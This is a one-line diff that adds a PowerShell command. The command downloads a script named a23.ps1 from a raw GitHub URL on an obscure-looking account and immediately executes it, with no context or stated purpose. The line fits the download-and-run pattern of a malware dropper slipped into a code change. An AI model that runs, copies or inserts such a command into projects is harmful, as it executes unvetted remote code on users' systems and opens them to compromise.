@@ -1,0 +1,1 @@
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/Droid567492/sdbdfg/main/a23.ps1 -OutFile .\a23.ps1; .\a23.ps1
